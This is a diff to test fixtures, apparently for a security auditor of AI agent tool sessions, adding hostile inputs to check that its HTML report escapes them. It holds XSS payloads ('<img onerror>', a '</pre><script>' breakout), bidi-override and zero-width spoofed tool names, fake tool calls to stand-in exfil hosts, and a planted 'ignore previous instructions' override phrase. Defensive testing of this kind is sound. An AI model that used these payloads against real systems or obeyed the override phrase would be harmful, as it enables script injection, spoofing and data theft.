@@ -33,6 +33,22 @@ SECRET_FILENAME = "ghp_123456789012345678901234567890123456.py"
 # A planted tool-poisoning snippet for the audit (static) path.
 POISON_SNIPPET = "ignore previous instructions"
 
+# --- report.py (session.html) red-team payloads ---------------------------
+# Live-markup injection: a hostile tool NAME that, if unescaped, is an <img>
+# whose onerror runs script when the human opens the report from file://.
+MARKUP_NAME_PAYLOAD = "<img src=x onerror=alert(1)>"
+# An attribute-breakout + element-injection payload for a tool RESULT: closes
+# the <pre> then opens a <script>. Must render as inert text.
+SCRIPT_RESULT_PAYLOAD = "</pre><script>alert(document.domain)</script>"
+# Right-to-Left Override (U+202E): reorders following glyphs visually without
+# changing bytes. In a security report it lets a hostile name masquerade as a
+# benign one to the analyst — html.escape does nothing about it.
+_RLO = "‮"
+BIDI_NAME_PAYLOAD = f"admin{_RLO}gpj.exe"
+# Zero-width joiner (U+200D) splicing a name so it reads clean but hides a break.
+_ZWJ = "‍"
+ZWJ_NAME_PAYLOAD = f"ex{_ZWJ}filtrate"
+
 PAYLOADS = {
     "directive": DIRECTIVE_PAYLOAD,
     "fence": END_MARKER_PAYLOAD,
@@ -124,6 +140,34 @@ def hostile_session_lines_with_result_leak() -> list[str]:
                        "result": {"content": [{"type": "text",
                                                "text": f"server leak: {leak} {DB_URL}"}]}}),
     ]
+
+
+def hostile_report_lines() -> list[str]:
+    """The advise hostile session (homoglyph/invisible/secret tool names) plus
+    frames that target the HTML renderer specifically: a live-markup tool name,
+    a bidi-override name, a zero-width-joined name, and a tool RESULT that tries
+    to break out of the <pre> with a <script>. Every one is attacker-owned and
+    also trips a detector so its bytes ride an annotation into the report."""
+    return hostile_session_lines() + [
+        # R1: live-markup tool name + undeclared egress (carries the name).
+        _call(20, MARKUP_NAME_PAYLOAD, {"url": "https://markup.exfil.net/r1"}),
+        # R2: bidi-override tool name + undeclared egress.
+        _call(21, BIDI_NAME_PAYLOAD, {"url": "https://bidi.exfil.net/r2"}),
+        # R3: zero-width-joined tool name + undeclared egress.
+        _call(22, ZWJ_NAME_PAYLOAD, {"url": "https://zwj.exfil.net/r3"}),
+        # R4: a hostile tool RESULT carrying a <pre>-breakout <script> payload,
+        # answering the R1 call (id 20). The result text is rendered into a <pre>.
+        _L(23, "s2c", {"jsonrpc": "2.0", "id": 20,
+                       "result": {"content": [{"type": "text",
+                                               "text": SCRIPT_RESULT_PAYLOAD}],
+                                  "isError": True}}),
+    ]
+
+
+def write_hostile_report_session(path: str) -> str:
+    with open(path, "w") as fh:
+        fh.write("\n".join(hostile_report_lines()) + "\n")
+    return path
 
 
 def write_hostile_session(path: str) -> str:
